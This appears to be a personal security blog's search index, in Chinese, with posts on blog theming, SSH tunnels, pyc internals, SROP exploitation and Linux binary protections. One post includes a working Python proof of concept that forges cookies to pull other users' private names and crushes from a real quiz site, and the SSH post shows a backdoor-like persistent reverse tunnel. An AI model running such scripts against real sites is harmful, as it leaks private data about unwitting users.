{"pages":[{"title":"我是誰","text":"皮卡丘 目前就讀台大資訊安全碩士班碩二 Awards Year Rank Contest 2017 Silver Medal ACM-ICPC Asia Hua-Lien Taiwan Online Programming Contest 2017 Silver Medal 2017 Silver Medal ACM-ICPC Asia Hua-Lien Regional Contest 2017 Finalist HITCON CTF Cyber Security Competition World Final 2018 Finalist DEFCON 26nd CTF Cyber Security Competition World Final 2018 Finalist VolgaCTF Cyber Security Competition World Final 2018 3rd Place HITCON CTF Cyber Security Competition 2019 2nd Place DEFCON 27nd CTF Cyber Security Competition World Final Presentations Conference Subject HITCON CMT 2017 (Cyber Security Conference) 滲透測試基本技巧與經驗分享 HITCON CMT 2018 (Cyber Security Conference) 那些年的密碼學後門 CODE BLUE 2020 @ Tokyo Cryfind : A Static Tool to Identify Cryptographic Algorithm in Binary Publications Conference Subject The 2018 IEEE Conference on Dependable and Secure Computing Design and Implement of a Binary Fuzzer based on Libfuzzer The 2021 IEEE Conference on Dependable and Secure Computing Cryfind : Using Static Analysis to Identify Cryptographic Algorithms in Binary Executables Contacts 如果想跟我連絡的話 123456# emailbase64 -d &lt;&lt;&lt; amVmZnJleTY5MTBAZ21haWwuY29t# githubbase64 -d &lt;&lt;&lt; aHR0cHM6Ly9naXRodWIuY29tL29hbGllbm8K# instagrambase64 -d &lt;&lt;&lt; aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9vYWxpZW5vCg==","link":"/about/index.html"}],"posts":[{"title":"【部落格開發日誌】0x00","text":"之前的部落格是用 mkdocs，但是 mkdocs 其實是用來生成 document 的，不是拿來生成部落格的，所以文章都沒有日期，也沒有近期文章或是標籤的功能，我之所以選 mkdocs 是因為 mkdocs-material 實在太好看了很對我胃口，不過最近興起了想幫部落格換個皮的念頭，主要是看上了 icarus 和 material-x 這兩個主題，都是 hexo 的主題，最後選了 icarus，然後再自己手動調整，下面會說明一下我手動調整的內容 排版 這個主題整體來說很好看的，但是我不喜歡他的排版，文章只能擠在中間細細長長的，左右兩邊還留了很多空隙，不知道是作者的螢幕太小還是我螢幕太大，所以我把所有 widget 都移到左邊，然後把欄位的比例改成 3:9，css 的部份在 source/css/style.styl:21 把寬度調寬 layout/layout.ejs12case 2: return 'is-9-tablet is-9-desktop is-9-widescreen'; layout/common/widget.ejs12case 2: return 'is-3-tablet is-3-desktop is-3-widescreen'; source/css/style.styl1234567891011121314gap = 40px...@media screen and (min-width: screen-widescreen) .is-1-column .container .is-2-column .container max-width: screen-widescreen - 2 * gap width: screen-widescreen - 2 * gap@media screen and (min-width: screen-fullhd) .is-2-column .container max-width: screen-fullhd - 2 * gap width: screen-fullhd - 2 * gap .is-1-column .container max-width: screen-fullhd - 2 * gap width: screen-fullhd - 2 * gap Read More 原本 icarus 只有 excerpt 這個選項可以加在文章的 front-matter 中，如下 1234---title: &quot;部落格開發日誌&quot;excerpt: 寫一些摘要在這邊--- 但是要每一篇都要自己寫摘要好麻煩，我比較想要的是只顯示固定長度，然後邊邊模糊處理，所以就自己手刻了一個 layout/common/article.ejs12345678&lt;div class=&quot;card &lt;%= index &amp;&amp; (!post.hasOwnProperty('readmore') || post.readmore) ? 'card-readmore' : '' %&gt;&quot;&gt;... &lt;% if (index &amp;&amp; (!post.hasOwnProperty('readmore') || post.readmore)) { %&gt; &lt;div class=&quot;level is-mobile readmore-button&quot;&gt; ... &lt;/div&gt; &lt;% } %&gt;... source/css/style.styl12345678910111213141516171819202122232425262728.card-readmore max-height: 400px overflow: hidden position: relative .readmore-button position absolute left: 0 bottom: 20px width: 100% display: flex justify-content center z-index: 20 &amp;:after content: '' position: absolute bottom: 60px width: 100% height: 100px z-index: 10 background-image: linear-gradient(to bottom, hsla(0, 100%, 100%, 0), hsla(0, 100%, 100%, 0.9)) &amp;:before content: '' position: absolute bottom: 0 width: 100% height: 60px z-index: 10 background-image: linear-gradient(to bottom, hsla(0, 100%, 100%, 0.9), hsla(0, 100%, 100%, 1)) Adblock 我本身有在用 AdBlock，然後在用 icarus 主題的時候發現有些物件會憑空消失，比如 back-to-top 那個按了可以回到頁面頂端的小按鈕，後來發現是被 AdBlock 砍了，因為那個小按鈕有 .back-to-top 這個 class，不只 .back-to-top 還有很多關鍵字會被砍，可以看這份 Class and ID to avoid because of AdBlock，那我的解決辦法就是把原始碼裡所有的 back-to-top 改名成 bottom-to-top 就在剛剛，我寫完第一段之後，發現上面的 h2 標題 Adblock 因為 markdown 生成 html 時自動加了 id=Adblock，然後就被 AdBlock 砍了，只好改成自己手刻 html 1&lt;h2&gt;Adblock&lt;/h2&gt; 另一個被砍掉的是 font-awesome 的 icon .fa-instagram，這個就不好改名了，所以我加了一小行 javascript 把 .fa-ig 改成 .fa-instagram，以結果來看我的 script 跑的順序應該是比 AdBlock 來得後面所以沒有被砍 source/js/main.js1234$(document).ready(function() { $('.fa-ig').addClass('fa-instagram'); $('.fa-ig').removeClass('fa-ig');}); Github mkdocs-material 主題的右上角有顯示 github star 的功能，我覺得很酷，所以就搬過來了 layout/common/navbar.ejs123456&lt;a class=&quot;navbar-item github-source&quot; href=&quot;&lt;%= github.url %&gt;&quot;&gt; &lt;div class=&quot;github-source-icon&quot;&gt;&lt;i class=&quot;fab fa-lg fa-github-alt&quot;&gt;&lt;/i&gt;&lt;/div&gt; &lt;div class=&quot;github-source-repository&quot;&gt; &lt;%= github.name %&gt; &lt;/div&gt;&lt;/a&gt; source/css/style.styl1234567891011121314151617181920212223242526.github-source .github-source-icon padding: 5px .github-source-repository padding-left: 10px font-size: 10px font-weight: 1000 ul animation: animateElement linear .3s; animation-iteration-count: 1; li float: left font-weight: 200 #github-forks margin-left: 3px@keyframes animateElement{ 0% { opacity:0; transform: translate(0px,10px); } 100% { opacity:1; transform: translate(0px,0px); }} source/js/main.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647if (typeof (IcarusThemeSettings) !== 'undefined' &amp;&amp; typeof (IcarusThemeSettings.github.url) !== 'undefined') { const url = IcarusThemeSettings.github.url console.log(url) const matches = /^.+github\\.com\\/([^/]+)\\/?([^/]+)?.*$/.exec(url) console.log(matches) if (matches &amp;&amp; matches.length === 3) { const [, user, name] = matches console.log(user, name) const api = `https://api.github.com/users/${user}/repos` const paginate = (page = 0) =&gt; ( fetch(`${api}?per_page=100&amp;sort=updated&amp;page=${page}`) .then(response =&gt; response.json()) .then(data =&gt; { if (!(data instanceof Array)) return [] /* Display number of stars and forks, if repository is given */ if (name) { const repo = data.find(item =&gt; item.name === name) if (!repo &amp;&amp; data.length === 30) return paginate(page + 1) if (typeof repo.stargazers_count !== 'number' || typeof repo.forks_count !== 'number') return [] /* If we found a repo, extract the facts */ return repo ? [ `${repo.stargazers_count} Stars`, `${repo.forks_count} Forks` ] : [] /* Display number of repositories, otherwise */ } else { return [ `${data.length} Repositories` ] } }) ) paginate().then(data =&gt; { console.log(data) const [stars, forks] = data const facts = $(`&lt;ul class=\"github-facts\"&gt;&lt;li id=\"github-stars\"&gt;${stars}&lt;/li&gt;&lt;li id=\"github-forks\"&gt;• ${forks}&lt;/li&gt;&lt;/ul&gt;`) $('.github-source-repository').append(facts) }) }} 舊部落格 舊的部落格我還在慢慢搬移當中，所以我把 mkdocs 生成的 html 放進來 hexo 當 static files，只要放在 source/old/ 底下然後在 _config.yml 裡面加一行 skip_render: old/**，hexo 就不會去 render 他了 疑難雜症 在改主題原始碼的過程中，遇到各種奇怪問題時，記得先 hexo clean 一下","link":"/2020/01/23/blog00/"},{"title":"【部落格開發日誌】0x01","text":"部落格架好後，趁熱使用一下各種網站追蹤評測的工具，比如 Google Search Console, Google Analytics, PageSpeed Insights, Sitechecker, Hotjar Hotjar 記錄使用者點擊的 heatmap 記錄使用者游標移動的路徑 還可以收集使用者的 feedback 回饋，不過載入時間有點久，部落格也不太需要這些資訊，所以就拔掉了，試用一下而已xD SEO Defer offscreen images 參考 Lazy load offscreen images with lazysizes，只要載入 lazysizes 這個 scripts 進來，然後把 src 改成 data-src 並加上 class=&quot;lazyload&quot; 就好了 註冊個 hexo 的 after_render，把所有 img tag 抓出來改就完事了 scripts/lazy-load-image.js123hexo.extend.filter.register('after_render:html', function (htmlContent) { return htmlContent.replace(/&lt;img src=\"([^\"]*)\" (?:class=\"([^\"]*)\")?([^&gt;]*)&gt;/, '&lt;img data-src=\"$1\" class=\"$2 lazyload\" $3&gt;')}); lazysizes 有 cdn，很方便的 layout/common/scripts.ejs1&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/lazysizes.min.js&quot; defer&gt;&lt;/script&gt; Sitemap 1npm install hexo-generator-sitemap 裝好 hexo-generator-sitemap 之後，在 _config.yml 加一行收工 12sitemap: path: sitemap.xml Robots.txt 直接放在 source/_posts 下面就行了，簡單搞定","link":"/2020/02/08/blog01/"},{"title":"【部落格開發日誌】0x02","text":"Admonition 我把 Material for MkDocs - Admonition Extension 搬過來啦，因為實在太好看，就搬過來用了，並且做了下面兩個小改動 把 border-radius 拔掉了，還是方的好看 陰影改淡了，感覺比較對 example這是範例 note這是範例 abstract這是範例 info這是範例 tip這是範例 success這是範例 question這是範例 warning這是範例 failure這是範例 danger這是範例 quote這是範例 實作 從 hexo-tag-admonition 借 code 過來改 基本上就是 register 一個新的 hexo tag，然後用到了 details 和 summary 這兩個 html5 新的 tag 改的時候有幾個小地方要注意 details tag 原本就有一個箭頭但是很醜，在 summary::-webkit-details-marker 設定 display:none 拔掉他 icon 用到了 font-family: Material Icons，要在 head 裡面加個字體 Highlight 另一個改動是程式碼區塊的部分，原來的有點小醜，就改了幾下 沒有給檔名就不要顯示上面的 header 可以指定起始行數，以及指定標記特定行數，如下範例 1python run.py &gt;3,6 run.py >3,6123456import mathdef main(): print(f'test {math.factorial(5)}')main()","link":"/2020/02/22/blog02/"},{"title":"【資安小故事】餅乾猜猜樂","text":"事情是這樣的，我在別人的挨居的自介上面看到一個連結，就好奇的點了進去 裡面看起來就是那種心裡測驗的網站，愛情計算器，幫你測你和喜歡的人配不配 聰明如我資安小天才，當然是隨便亂打個 abcd 就送出看看這是在耍什麼花樣 果然是愚弄人的網站，如果你誠實的填上你的名字和你喜歡的人的名字，就被分享給你連結的人看光光啦 在你生氣的同時，這個網站就很好心的讓你註冊一下好發洩怨氣 那我當然也順手按了一下註冊（免錢的隨手按一下），這時候就可以把連結分享給別人囉 這個可以看中了我的圈套的受害者名單的頁面，我只要把 cookie 清掉，就會被帶到前面第一個愛情計算器（陷阱）頁面，代表他有用 cookie 去驗證你是誰 有對的 cookie 他會給我受害者名單 不對的 cookie 他會讓我掉進陷阱 那在看看他的 cookie 之前眼尖的我，就發現他的 url 有些地方像像的，而且後面的 userid 很短 https://cn.lovemeter.me/user/5S1X https://cn.lovemeter.me/user/5S1Y https://cn.lovemeter.me/user/5S1Z 多註冊幾次會發現，他的 userid 怎麼感覺好像是每次 counter++ 再多嘗試幾次，就會發現 userid 的字元只會是 0-9a-zA-Z 的字元組成 然後重點是他的 cookie 是個數字，而且完完全全是 counter++ 的樣子 user_quiz_1399337=1399337 user_quiz_1399337=1399338 user_quiz_1399337=1399339 那這個 userid 跟這個 cookie 的 id 的對照是怎麼樣的呢 猜一猜就能發現他其實是把 0-9a-zA-Z 當成 0-61 的 62 進位（很合理吧） 1234convert('5S1X') = 5 * (62 ** 3) + 54 * (62 ** 2) + 1 * (62 ** 1) + 59 * (62 ** 0) = 1399337 那我們只要把他的 userid 轉回數字，並新增個 cookie，就能成功看到別人的受害者名單囉 Proof Of Concept ( POC ) source code12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env python3import reimport sysimport jsonimport stringfrom prettytable import PrettyTableimport requestsif len(sys.argv) &lt; 2: print('usage: ./lovemeter.py (url)') exit(0)value = string.digits + string.ascii_lettersdef uid2num(uid): num = 0 for ch in uid: v = value.index(ch) num = num * len(value) + v return numdef num2uid(num): uid = '' while num &gt; 0: v = num % len(value) uid += value[v] num //= len(value) return uid[::-1]url = sys.argv[1]r = re.search('https:\\/\\/(\\w+)\\.lovemeter.me\\/\\w+\\/(\\w+)', url)prefix = r.group(1)uid = r.group(2)num = uid2num(uid)r = requests.get(f'https://{prefix}.lovemeter.me/other-user-stats/{uid}', headers = { 'cookie': f'user_quiz_{num}={num}', 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1'})data = json.loads(r.text)['data']t = PrettyTable(['名字', '喜歡的人'])for item in data: item = json.loads(item) t.add_row([item['userFullName'], item['crushFullName']])print(t) usage1python lovemeter.py https://cn.lovemeter.me/user/1234","link":"/2018/11/21/lovemeter/"},{"title":"【實測】LINE TAXI 乘車體驗 - 輸入「ATAAKH」優惠序號 現折 50 元","text":"LINE TAXI 就是計程車的叫車平台，所以叫來的會是計程車，只要加 @linetaxi 好友，就可以開始叫車了。 我一直都是 Uber 的忠實用戶，昨天想說來用用看 LINE TAXI，因為 LINE TAXI 的價格比較便宜，但可能是因為叫車的時間是晚上九點，而且叫車的地點離市中心有一點距離，所以 Uber 比較貴要 155 元，而 LINE TAXI 預估的價格只有 120 - 130 元。 使用體驗和 Uber 基本上差不多，不過還是有一些不同，比如 LINE TAXI 顯示的價格是預估價格，但還是要以計程車實際跳表的價格為主 計程車司機通常話很多，和 Uber 司機比起來 LINE TAXI 的優點 優惠多 : 除了首乘折 100 元之外，次乘再折 30 元，而且每天都可以抽乘車券，我都抽到九折乘車券，不知道有沒有別的 可以綁信用卡或 APPLE PAY 或 LINE PAY 或 GOOGLE PAY，也可以付現 LINE TAXI 的缺點 不是一個獨立的 app，是 LINE 裡面的聊天機器人 計程車司機話比較多，我只想要安靜的搭車車","link":"/2020/02/15/line-taxi/"},{"title":"【一秒變達人】Netflix 實用小技巧","text":"今天要來介紹一些實用的知識，幫助你提升追劇體驗 調整速度 可以用這個 chrome 插件 Video Speed Controller 這個插件可以用來調整 html5 video ( netflix 在瀏覽器上用的 ) 的速度，且不限於 netflix VPN 不同地區授權的影片也不太一樣，可以先到 uNoGS 上面查詢想要看的影片在哪裡可以看，然後跳 vpn 過去 中文字幕 不在台灣地區的影片大部分都沒有中文字幕 上網找中文字幕，比如這個網站 subhd 用這個網站 subtitle converter 把其他格式的字幕檔 dfxp 格式 ( netflix 字幕檔格式) CTRL + OPTION + SHIFT + t 載入字幕 隱藏面板 數據面板 : CTRL + OPTION + SHIFT + d / CTRL + OPTION + SHIFT + q 日誌面板 : CTRL + OPTION + SHIFT + l 隱藏分類 netflix 有一大堆分類 比如 http://www.netflix.com/browse/genre/10118 是漫畫及超級英雄片分類 url 後面填不同的數字就有不同的分類 https://blog.gslin.org/archives/2016/04/09/6485/%E7%94%A8%E7%80%8F%E8%A6%BD%E5%99%A8%E7%9C%8B-netflix-%E5%8A%A0%E9%80%9F%E6%92%AD%E6%94%BE/","link":"/2019/03/23/netflix/"},{"title":"【技術筆記】pyc 與他們的產地","text":"pyc 格式 前 8 bytes 是 magic number，不同的 python 的版本會有不同的 magic number，參考 /python/cpython/Lib/importlib/_bootstrap_external.py 或 /google/pytype/blob/master/pytype/pyc/magic.py 接下來 8 bytes 會是 pyc 被產生出來的時間戳記 剩下的都是序列化的 PyCodeObject ( marshal.dumps 的結果 ) python2python2 的 magic number 和時間戳記都是 4 bytes 編譯 pyc import import 其他的 python 程式的時候，會把被引入的程式編譯成 .pyc 放到 __pycache__ 資料夾 這樣可以減少引入的時間 py_compile 12import py_compilepy_compile.compile('test.py') 就會生成 .pyc 檔在 __pycache__ 資料夾 compileall 1python -m compileall . 可以一次 compile 資料夾內所有檔案 反編譯 pyc 要 decompile pyc 可以使用 uncompyle6 或 decompyle3 或 pycdc 但是注意到 uncompyle6 對 3.6 版以上的支援沒有很好，可以看 這個 issue，作者沒錢拿也累了，而且新版本又多了新東西，cfg 更難分析，所以 fork 出去了 decompyle3 試圖重新整理並解決問題。 1uncompyle6 test.pyc 1234567891011# uncompyle6 version 3.3.2# Python bytecode 3.7 (3394)# Decompiled from: Python 3.7.0 (default, Oct 9 2018, 16:58:41)# [GCC 5.4.0 20160609]# Embedded file name: /home/oalieno/lib.py# Size of source mod 2**32: 23 bytesdef f(x): return x# okay decompiling lib.cpython-37.pyc marshal &amp; dis 123456789101112131415import marshalimport dis# PyCodeObjectcode = marshal.loads(open('test.pyc', 'rb').read()[16:])code = compile('x = 1', 'filename', 'exec')# bytecodecode.co_code# disassemble PyCodeObject (with line number and some meta data)dis.dis(code)# disassemble bytecode (directly)dis.dis(code.co_code) 用眼睛看 marshal dumps data 可以參考 marshal.c，格式都是一個 byte 的 type 加上後面一段 data，主要的程式碼在這裡 marshal.c line 953，這裡的 r_object 嘗試去讀一個 object 進來，裡面就用 switch case 去處理不同的 type。 比如 TYPE_INT 就是用 r_long 去讀 4 個 bytes 的 long 進來，所以 marshal.dumps(1) 就會長得像 b'\\xe9\\x01\\x00\\x00\\x00'，前面的 type 有時候會被 | 0x80，請看 marshal.c line 223，所以 0xe9 &amp; (0x80 - 1) = ord('i')。 另一個像是 TYPE_CODE 就先 r_long 了六次，讀了 argcount, posonlyargcount, kwonlyargcount, ... 進來，接下來才用 r_object 把 code 讀進來 ( 也就是 bytecode )，讀進來的 object 其實是 bytes 型態，也就是 bytecode 是用 bytes 型態存在 code object 裡面的，接下來再繼續把一些 consts, names, varnames, ... 讀進來。 https://docs.python.org/3/library/dis.html http://unpyc.sourceforge.net/Opcodes.html https://kdr2.com/tech/main/1012-pyc-format.html https://late.am/post/2012/03/26/exploring-python-code-objects.html","link":"/2019/06/07/pyc/"},{"title":"【指令怎麼用】SSH Tunnel 篇","text":"basic config ~/.ssh/config1234Host dev HostName 123.45.67.89 User oalieno Port 22000 這樣設定好後 ssh dev 就等同於 ssh -p 22000 oalieno@123.45.67.89 IdentityFile ~/.ssh/config12345Host dev HostName 123.45.67.89 User oalieno Port 22000 IdentityFile ~/.ssh/id_rsa IdentityFile 就是指定要用哪個 key，等同於 -i ~/.ssh/id_rsa 預設會抓 id_*.pub 中最新的 ( /usr/bin/ssh-copy-id 59 行 ) ssh tunnel ( port forwarding ) ~/.ssh/config12345Host dev HostName 123.45.67.89 User oalieno Port 22000 LocalForward 5555 127.0.0.1:6666 將 local 的 5555 port 透過 ssh tunnel 對應到 remote 的 6666 port 連線到 local 的 5555 port 等於連線到 remote 的 127.0.0.1 的 6666 port 不一定要用 127.0.0.1 也可以連到 remote 出去的 google.com:80 ( 透過 remote 瀏覽 google.com ) 設定好後可以直接打以下指令 123ssh -f -N dev# -f : run in background# -N : not execute remote command, useful for forwarding ports 就會等同於以下指令 123ssh -f -N -L 5555:127.0.0.1:6666 oalieno@123.45.67.89# -f : run in background# -N : not execute remote command, useful for forwarding ports reverse ssh tunnel ( reverse port forwarding ) ~/.ssh/config12345Host dev HostName 123.45.67.89 User oalieno Port 22000 RemoteForward 6666 127.0.0.1:5555 將 remote 的 6666 port 透過 reverse ssh tunnel 對應到 local 的 5555 port 連線到 remote 的 6666 port 等於連線到 local 的 5555 port 不一定要用 127.0.0.1 也可以連到 local 出去的 google.com:80 ( 透過 local 瀏覽 google.com ) 設定好後可以直接打以下指令 123ssh -f -N dev# -f : run in background# -N : not execute remote command, useful for forwarding ports 就會等同於以下指令 123ssh -f -N -R 6666:127.0.0.1:5555 oalieno@123.45.67.89# -f : run in background# -N : not execute remote command, useful for forwarding ports dynamic port forwarding ~/.ssh/config12345Host dev HostName 123.45.67.89 User oalieno Port 22000 DynamicForward 9999 設定好後可以直接打以下指令 123ssh -f -N dev# -f : run in background# -N : not execute remote command, useful for forwarding ports 就會等同於打以下指令 123ssh -f -N -D 9999 oalieno@123.45.67.89# -f : run in background# -N : not execute remote command, useful for forwarding ports 並在電腦上設定 SOCKS 代理伺服器 ( 127.0.0.1:9999 ) 之後你可以查找你的 ip 位址 ( https://www.whatismyip.com/ ) 會發現你已經跳去 123.45.67.89 autossh autossh 可以幫你自動重連 ~/.ssh/config12345678Host dev HostName 123.45.67.89 User oalieno Port 22000 IdentityFile ~/.ssh/id_rsa LocalForward 5555 127.0.0.1:6666 ServerAliveInterval 30 ServerAliveCountMax 3 設定好後可以直接打以下指令 1234autossh -M 0 -f -N dev# -M 0 : autossh echo port, recommend disable it by setting it to 0# -f : run in background# -N : not execute remote command, useful for forwarding ports 就會等同於打以下指令 1234autossh -M 0 -f -N -o \"ServerAliveInterval 30\" -o \"ServerAliveCountMax 3\" -L 5555:localhost:6666 oalieno@123.45.67.89# -M 0 : autossh echo port, recommend disable it by setting it to 0# -f : run in background# -N : not execute remote command, useful for forwarding ports 覺得不夠有時候還是會斷掉的話，或是要在開機時候也要開起來的話，可以再搭配上 crontab 服用 用 crontab 定時執行下面的 shell script 只要沒看到 autossh 這個 process，就再跑一次 搞的好像自己種自己後門一樣 1234567#!/bin/bash if [[ $(ps -C autossh) == *'autossh'* ]]; then :else autossh -M 0 -f -N devfi escape sequence 有時候連線斷掉後，畫面就會卡在那裡 這時候就可以直接在鍵盤上打 ~. 這個 escape sequences 就可以直接跳出來啦，感覺像是在逃脫 vim 呢xD 下面還有更多的神秘金手指可以打 123456789101112Supported escape sequences: ~. - terminate connection (and any multiplexed sessions) ~B - send a BREAK to the remote system ~C - open a command line ~R - request rekey ~V/v - decrease/increase verbosity (LogLevel) ~^Z - suspend ssh ~# - list forwarded connections ~&amp; - background ssh (when waiting for connections to terminate) ~? - this message ~~ - send the escape character by typing it twice(Note that escapes are only recognized immediately after newline.) https://linux.die.net/man/5/ssh_config https://nerderati.com/2011/03/17/simplify-your-life-with-an-ssh-config-file/ https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/ https://askubuntu.com/questions/29942/how-can-i-break-out-of-ssh-when-it-locks","link":"/2018/08/04/ssh/"},{"title":"【一秒變時尚】iTerm2 + zsh + zimfw + powerlevel10k + nord","text":"Zimfw 我也是用了很久的 oh-my-zsh，一直都覺得 terminal 有點慢，不過直到看到這篇 打造屬於你自己的極速 Shell「iTerm + zsh + zim + powerlevel10k」，才有想要換的念頭 zimfw 的優點就是快，雖然他不像 oh-my-zsh 一樣有這麼多內建的插件，但一般的 zsh 插件他也都可以安裝，而且最常用也一定要有的 zsh-syntax-highlight, zsh-completions, zsh-autosuggestions 預設都幫你配置好了，其他插件的安裝請看下面的說明 插件安裝 官方提供的插件在這，archive 預設沒裝，我推薦可以安裝，他跟 oh-my-zsh 的 extract 插件是同樣的功能，會自動幫你根據副檔名解壓縮，就不需要再去背那些指令 非官方的插件的話，我們以 alias-tips 這個插件做例子，只要在 .zimrc 加入下面一行 .zimrc1zmodule djui/alias-tips 然後打 zimfw install，他就會去幫你 git clone 那個 repo 下來，接著在載入插件的時候會去找 {init.zsh|module_name.{zsh|plugin.zsh|zsh-theme|sh}} 這個格式的檔名，只要找得到這樣的檔案的 github repo 基本上都可以安裝 Powerlevel10k powerlevel10k 看名字就知道是用來幹掉 powerlevel9k 的，記得當初看到 powerlevel9k 的時候兩眼發光，此生沒看過這麼漂亮的主題，直到現在看到 powerlevel10k powerlevel9k，那 powerlevel10k 究竟是猛在哪，就我來看，我覺得 powerlevel10k 最大的優點在於他優秀的客製化系統，請看下圖 可以讓你一步步設定每個細節，而且不用自己手動去改設定，只要跑 p10k configure 這個指令就好，對懶人十分的友善阿，而且 powerlevel10k 直接推薦我們安裝 MesloLGS NF 字型，裝好就完事了，不需要像 powerlevel9k 還要自己調字型和大小，另一個優點就是速度了，官方說是比 powerlevel9k 快上不少，但是因為我同時也換了 zimfw 所以不知道是不是真的有變快 Nord 顏色的配置我使用 Nord 這款，有冰天雪地高冷的感覺，我把他套用到 iTerm2, vim, tmux 上，讓整個環境有一致的色調，十分舒服，請看下圖，安裝的部分可以到官方的 github 裡面去找，各大常見的編輯器幾乎都有支援","link":"/2020/01/18/terminal/"},{"title":"【演算法筆記】莫隊算法","text":"問題敘述 給一大小 $N$ 的序列，回答 $M$ 次查詢，每次查詢都是問一個區間 $[L, R]$ 的答案（比如區間眾數） 使用條件 可以在很短的時間內由 $[L, R]$ 得到 $[L, R + 1], [L - 1, R], [L, R - 1], [L + 1, R]$ 的答案 可以離線運算（也就是可以把輸入通通吃進來再輸出） 算法 將 $M$ 次查詢根據 $L$ 的大小分為 $\\sqrt{N}$ 塊 也就是每塊裡面的 $L$ 最多只會差距 $\\sqrt{N}$ 每塊裡面的 $R$ 再由小到大排序 按照排好的順序算答案，缺少什麼就一個個加進來，多了什麼就一個個丟掉 add 函式就是實作把一個數加進目前的區間 sub 函式就是實作把一個數從目前的區間丟掉 123456struct Q { int l, r, b, i; bool operator &lt; (const Q &amp;q) { return b == q.b ? (r &lt; q.r) : b &lt; q.b; }} q[MAXM]; 1234567891011int block = ceil(sqrt(MAXN));for (int i = 0; i &lt; m; i++) { int l, r; cin &gt;&gt; l &gt;&gt; r; q[i].l = l; q[i].r = r; q[i].b = q[i].l / block; q[i].i = i;}sort(q, q + m); 1234567for (int i = 0, L = 0, R = -1; i &lt; m; i++) { while (R &lt; q[i].r) add(a[++R]); while (q[i].l &lt; L) add(a[--L]); while (q[i].r &lt; R) sub(a[R--]); while (L &lt; q[i].l) sub(a[L++]); ans[q[i].i] = cur;} 時間複雜度 $O(N^{1.5})$ 奇偶優化 第一塊的 $R$ 從小到大 第二塊從 $R$ 大到小 第三塊從 $R$ 小到大 在從第一塊要到第二塊的時候，$R$ 都是大的 在從第二塊要到第三塊的時候，$R$ 都是小的 123bool operator &lt; (const Q &amp;q) { return b == q.b ? (r &lt; q.r) ^ (b % 2) : b &lt; q.b;} 題目 Codeforces 86D - Powerful array http://sunmoon-template.blogspot.com/2015/08/mos-algorithm.html https://zhuanlan.zhihu.com/p/25017840 https://oi-wiki.org/misc/mo-algo/","link":"/2019/04/18/algorithm/mo/"},{"title":"SROP ( Sigreturn Oriented Programming )","text":"Signal 一支程式接到 signal 後 kernel 會幫你把上下文 ( 各種暫存器 ) 保留到 stack 上，叫做 Signal Frame 跳回 user mode，讓 signal handler 處理 signal handler 處理完會 return 回 __restore_rt，這個 function 裡面就是 mov rax, 0xf; syscall，去呼叫 sys_rt_sigreturn syscall，把上下文恢復 Signal Frame SigReturn ROP 在做 ROP 的時候需要設定許多暫存器的值 這時候就可以用 SROP 的技巧 自己在 stack 上擺好 Signal Frame，然後呼叫 sys_rt_sigreturn syscall 就可以一次設定好所有的暫存器 缺點是需要夠大的空間塞下整個 Signal Frame sys_rt_sigreturn syscall gadget 哪裡有 mov rax, 0xf; syscall 的 gadget 可以用 libc 裡面的 __restore_rt 自己用 ROP 設定好 rax, 再接 syscall gadget pwntools SigFrame 123456789frame = SigreturnFrame()frame.rsp = 0frame.rax = 0frame.rdi = 0frame.rsi = 0frame.rdx = 0frame.rip = 0rop = bytes(frame) CTF 題目 pwnable.kr - unexploitable https://www.slideshare.net/AngelBoy1/sigreturn-ori http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/","link":"/2019/09/18/security/pwn/srop/"},{"title":"Linux 程序保護機制","text":"RELRO (RELocation Read Only) RELRO 說明 gcc 編譯參數 No GOT writable, link_map writable gcc -Wl,-z,norelro code.c Partial GOT writable, link_map readonly DEFAULT Full GOT read only, no link_map and dl_resolver pointer gcc -Wl,-z,relro,-z,now code.c CANARY stack overflow - gcc generate canary or not Canary gcc 編譯參數 Enable DEFAULT (when buffer large enough) Disable gcc -fno-stack-protector code.c NX (No-Execute) / DEP (Data Execution Prevention) 可以寫的地方不能執行 NX / DEP gcc 編譯參數 execstack Enable DEFAULT execstack -s code Disable gcc -z execstack code.c execstack -c code ASLR (Address Space Layout Randomization) Configuring ASLR with randomize_va_space 1230 - 表示關閉進程地址空間隨機化。1 - 表示 mmap, stack, vdso 隨機化。2 - 表示比 1 多了 heap 隨機化。 12sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_spacesudo sysctl -w kernel.randomize_va_space=0 PIE (Position Independent Executables) PIE gcc 編譯參數 Enable gcc -fpie -pie code.c Disable DEFAULT FRAME POINTER 有開的話是 12leaveret 沒開的話是 12add rsp, 0x18ret Canary gcc 編譯參數 Enable DEFAULT Disable gcc -fomit-frame-pointer code.c checksec checksec 是一個用來查看上述所說的保護機制的 bash script 12RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEFull RELRO No canary found NX enabled PIE enabled No RPATH No RUNPATH 65 Symbols No 0 1 ./hello pwntools 也有內建一個名字和功能都一樣的指令 12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled","link":"/2019/03/21/security/pwn/protection/"},{"title":"【安卓逆向】Android Studio Emulator + ADB 環境佈置","text":"紀錄一下怎麼設定好一台 Android 的虛擬機 我是用 Android Studio 裡面的 Emulator，所以要先裝一下 Android Studio 打開 AVD Manager 後點 Create Virtual Device 選一個 device，比如 Pixel 3a 選一個 system image，比如 Pie 完成 ADB ( Android Debug Bridge ) 路徑 在 Android SDK 的 platform-tools 裡面，用 macos 的話應該會在 /Users/xxx/Library/Android/sdk/platform-tools/ 沒有的話可以去 官網 載 基本功能 指令 解釋 adb devices 列出所有裝置 adb root 用 root 權限重開 adb 服務 adb shell 互動式的 shell adb shell &quot;ls&quot; 執行一行指令 adb push ./myfile /data/local/tmp/ 傳檔案進去 adb pull /data/local/tmp/myfile ./ 抓檔案出來 adb reboot 重開機，可以簡單粗暴的驗證有沒有設置成功 如果有多台裝置的話，要加 -s 指定哪一個裝置，比如 adb -s emulator-5554 shell 疑難雜症 Q : 遇到 adbd cannot run as root in production builds 怎麼辦 ? A : 在選 image 的時候要選 target 是 Google APIs 的 Q : 